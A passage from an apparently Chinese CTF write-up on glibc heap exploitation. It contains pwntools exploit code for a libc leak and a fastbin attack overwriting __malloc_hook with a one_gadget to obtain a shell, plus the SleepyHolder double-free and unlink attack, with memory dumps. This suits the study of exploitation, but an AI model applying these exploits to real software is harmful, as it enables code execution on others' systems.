    ​    Free(1)
    ​    Alloc(0x60) #index 1
    ​    #Fix smallChunk
    ​    payload="a"*0x40
    ​    payload+=p64(0)+p64(0x91) #Chunk ->size
    ​    Fill(1,payload)
    ​    Free(2)
    ​    Dump(1)
    ​    p.recv(82)
    ​    leak_address=u64(p.recv(8))
    ​    print "leak stirngs=>"+hex(leak_address)
    ​    #Free(0) #for debug
    ​    return leak_address
成功leak时候的内存空间
    gef➤  x/50xg 0x561043fcd010-0x10
    0x561043fcd000:    0x0000000000000000    0x0000000000000071 size
    ​    Fill(0,payload)
    ​    Alloc(0x80) #index 2
    ​    Alloc(0x10) #index 3 ,to avoid chunk_2 merge into top_chunk
    ​    #Bk_NextSize=0x71, to avoid "free(): invalid next size (fast)"
    ​    payload=p64(0)*3
    ​    payload+=p64(0x71) #Chunk2->BK_nextsize
    ​    Fill(2,payload)
    ​    Free(1)
    ​    Alloc(0x60) #index 1
    ​    #Fix smallChunk
    ​    payload="a"*0x40
    ​    payload+=p64(0)+p64(0x91) #Chunk ->size
    ​    Fill(1,payload)
    ​    Free(2)
    ​    Dump(1)
    ​    p.recv(82)
    ​    leak_address=u64(p.recv(8))
    ​    print "[+]leak stirngs=>"+hex(leak_address)
    ​    #Free(0) #for debug
    ​    return leak_address
    def Attack(base):
    ​    malloc_hook=0x3C4B10-35+base
    ​    print "[+]malloc_hook => "+hex(malloc_hook)
    ​    one_gadget=base+0x4526a
    ​    print "[+]one_gadget => "+hex(one_gadget)
    ​    Alloc(0x60) #index 2
    ​    Alloc(0x60) #index 4
    ​    Alloc(0x60) #index 5
    ​    Free(5)
    ​    Free(4)#fastbin ->chunk_5->chunk_4
    ​    #Fill(2,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")    
    ​    Fill(2,"A"*(0x160-0xd0+0x18)+p64(0x71)+p64(malloc_hook)) #fastbin ->chunk_5->malloc_hook-35
    ​    Alloc(0x60)#index 4
    ​    Alloc(0x60)#index 5 =>malloc_hook-35
    ​    Fill(5,"A"*(35-16)+p64(one_gadget))
    ​    Alloc(0x10)#get shell
    leak_address=leak()
    base=leak_address-0x3c4b78
    print "[+]Libc Base Address =>"+hex(base)
    Attack(base)
    p.interactive()
**2.1.3一些注意事项**
在做题目前期碰到的一些问题与解决方案
1.Chunk无法释放到unsorted bins的问题
释放一个small chunk，然后这个chunk的FD和BK便是指向libc某地址的指针（unsroted
bins），就可以leak地址了。但是需要注意的是，并不是所有时候，chunk都会被释放到bins上。
例如
    Alloc(0x10) #index 0 
    Allocc(0x80) #index 1
    Free(1)
当我free一个small_chunk，发现它并没有被free到unsort bins（也没有到small
bins中），原因在_int_free函数中如此描述，如果释放的内存与top_chunk相邻（且不是fastbin），会被直接合并到top_chunk。之前一直忽略了这个性质。
解决方案很简单，在small_chunk之后再申请一个chunk就行，把它与top_chunk隔开就行。
        /*
    ​      If the chunk borders the current high end of memory,
    ​      consolidate into top
    ​    */
    ​    else {
    ​      size += nextsize;
    ​      set_head(p, size | PREV_INUSE);
    ​      av->top = p;
    ​      check_chunk(av, p);
    }
2.在释放chunksize被修改的Chunk_1时,报错invalid next size (fast)，即对next size的检查报错。
在程序Free一块内存的时候，会做如下检查。如果下一个chunk的bk next
chunk（nextchunk偏移24字节）不正确，则会阻止Free过程。源码如下。
        /* We might not have a lock at this point and concurrent modifications
    ​       of system_mem might have let to a false positive.  Redo the test
    ​       after getting the lock.  */
    ​    if (have_lock
    ​        || ({ assert (locked == 0);
    ​          mutex_lock(&av->mutex);
    ​          locked = 1;
    ​          chunk_at_offset (p, size)->size = av->system_mem;
    ​          }))
    ​      {
    ​        errstr = "free(): invalid next size (fast)";
    ​        goto errout;
    ​      }
查看chunk的结构体，发现bk_nextsize在头部(fd)偏移3个位，64位系统就是24个字节。
所以也就有了
    #Bk_NextSize=0x71, to avoid "free(): invalid next size (fast)"
    ​    payload=p64(0)*3
    ​    payload+=p64(0x71) #Chunk2->BK_nextsize
    ​    Fill(2,payload)
Malloc结构如下
    struct malloc_chunk {
      INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
###  2.2 案例分析2
SleepyHolder
概述：Hitcon2016年首创的一种利用手法，使用consolidate机制产生Double Free条件，然后结合unlink实现got表覆盖。
[下载链接](https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder)  
[参考思路](https://blog.csdn.net/qq_33528164/article/details/80040197)
**2.2.1利用细节:**
1.程序存在一个悬挂指针的问题，就是Free之后会清零标志位，但是不会删除指针。为Double Free提供了条件。
      switch(choice)
    ​    {
    ​        case 1:
    ​            free(f_ptr);//释放内存，没有删除指针f_ptr
    ​            f_flag = 0;//清楚标志位 
    ​            break;
    ​        case 2:
    ​            free(s_ptr);
    ​            s_flag = 0;
    ​            break;
    ​    }
2.每种内存只能申请一次，除非释放，三种内存又分别fast bins(small)、small bins、large
bins都无法相互影响。并且只能写入一次。不能为fastbin的Double Free创造条件。也就引出了这次的利用手法。
3.因为内存指针ptr都是全局变量，PIE又没开启，所以指针都位置是固定。本案例汇总f_ptr的地址就为0x6020d0
全局指针定义
    char *s_ptr;
    char *f_ptr;
    char *q_ptr;
**2.2.2利用思路:**
1.首先申请small和large各一块内存。释放small内存，其会被释放到fastbins.
释放huge内存，触发consolidate将fastbin内存整合到small bins,再次释放small。实现double free。
    #Double Free
    Add(1,"AAAAAA") 
    Add(2,"BBBBBB")
    Free(1) #将small chunk放入fastbins
    Add(3,"CCCCCC") #将small chunk放入small bins ，并且设置inuse为free
    Free(1) #double free
此时small同时被fastbins和small bins链接。
2.重新申请内存small，会从fastbin中取下来。此时small的inuse标志位依旧是0（consolidate会将标志为设置为Free，而fastbin的操作都不会影响标志位）这样就能在small中构造伪堆。释放large，触发unlink。
unlink参考 
    #Unlink
    p_ptr=0x6020d0
    fakechunk=p64(0)+p64(0x21)
    fakechunk+=p64(p_ptr-0x18)+p64(p_ptr-0x10)
    fakechunk+=p64(0x20)#for check
    Add(1,fakechunk)
    Free(2) #释放large内存，如果检查前一个堆块为free，则会触发Unlink合并堆块。
触发unlink的代码
        /* consolidate backward */
    ​    if (!prev_inuse(p)) {
    ​      prevsize = p->prev_size;
    ​      size += prevsize;
    ​      p = chunk_at_offset(p, -((long) prevsize));
    ​      unlink(av, p, bck, fwd);
    }
    ​    Free chunks结构
    ​    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ​        |             Size of previous chunk                            |
    ​        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ​    `head:' |             Size of chunk, in bytes                         |P|
    ​      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ​        |             Forward pointer to next chunk in list             |
    ​        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ​        |             Back pointer to previous chunk in list            |
    ​        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ​        |             Unused space (may be 0 bytes long)
    gef➤  x/10gx 0x11b2da0-0x10
    0x11b2d90:    0x0000000000000000  0x0000000000000031
    0x11b2da0:    0x0000000000000000      0x00007fe12672db98 <-f_ptr
    0x11b2db0:    0x0000000000000000      0x0000000000000000
构造fake_chunk
    gef➤  x/10gx 0x11b2da0-0x10
    0x11b2d90:    0x0000000000000000     0x0000000000000031
    0x11b2da0:    0x0000000000000000     0x0000000000000021 <-f_ptr
    0x11b2db0:    0x00000000006020B8<-FD 0x00000000006020C0<-BK <-fake_chunk
    0x11b2dc0:    0x0000000000000020    <-Next_size 0x0000000000000fb0